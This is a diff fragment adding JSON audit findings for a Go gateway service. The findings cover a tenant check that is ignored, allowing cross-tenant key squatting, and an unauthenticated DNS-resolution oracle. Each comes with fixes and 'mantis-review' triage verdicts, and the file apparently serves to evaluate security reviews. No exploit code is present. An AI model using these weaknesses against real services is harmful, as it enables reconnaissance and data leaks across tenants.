+      "impact": "Two consequences. First, cross-tenant key squatting: the first tenant to Put a common key name owns it globally and every other tenant's Put of that name fails with errNotOwner, an availability and namespacing defect with no administrative remedy exposed. Second, an unused authorisation parameter is a latent trap - any future caller that reads the returned body without repeating main.go:67's check leaks another tenant's object, and adminOverview and the usage action already read s.meta without any tenant filter. No current disclosure path was demonstrated, hence probable.",
+      "recommendation": "Key the maps by a composite (tenant, key) - or delete the unused parameter and rename the function so it cannot be mistaken for a scoped read. Enforcing the tenant inside Get is the safer of the two, since it makes the check impossible to forget.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). store.go:98-107 verified (the tenant parameter appears only in the signature); the compensating check verified at main.go:66-70; Put's ownership check at store.go:56."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The key-squatting effect is deterministic, but no cross-tenant disclosure is triggerable today because the sole caller re-checks the tenant; status therefore probable."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the object key derived from the request path at main.go:54 (`strings.TrimPrefix(r.URL.Path, \"/v1/objects/\")`), which is the sole index into the global map."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The finding is not that a caller misuses Get, but that Get accepts and discards the parameter that would make misuse impossible."
+        }
+      ]
+    },
+    {
+      "title": "Unauthenticated DNS resolution oracle on /internal/resolve",
+      "location": {
+        "path": "mesh-gateway/service/diag.go",
+        "symbol": "server.handleResolve",
+        "line": 44
+      },
+      "class": "Information disclosure",
+      "severity": "low",
+      "status": "probable",
+      "evidence": "`net.DefaultResolver.LookupHost(ctx, name)` with name taken from the query string (line 35) and no validation or allowlist. The handler returns whether resolution succeeded and how many addresses came back (lines 45-49). Like the other /internal routes it has no authorisation of its own and is registered on the same mux (main.go:121), which is directly reachable on the published port 8081.",
+      "impact": "The service's resolver can be driven by an outside caller: internal service names can be enumerated one query at a time from the resolved/addresses response, and DNS lookups to an attacker-controlled zone provide a low-bandwidth out-of-band channel from inside the mesh. No connection is made and no address is returned, which bounds the impact - and the same surface already offers full command execution via /internal/diag, so this adds little in practice.",
+      "recommendation": "Put the /internal routes behind authentication (see the exposed-service finding) and, if the probe is kept, restrict name to an allowlist of known upstreams.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). diag.go:34-49 and main.go:121 verified."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `r.URL.Query().Get(\"name\")` at diag.go:35, reaching the resolver unmodified."
+        },
+        {
+          "rule": "FP-07",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 7 (ignore_resource_exhaustion_dos); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Reported as reconnaissance and out-of-band signalling, not as a resource-exhaustion claim."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 5 (no_security_flaw_stretching); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Borderline: the same route group already yields command execution, so this could be judged an adjacent class stretched from a stronger finding. Kept at low severity and probable status for that reason."
+        }
+      ]
+    }
+  ]
+}
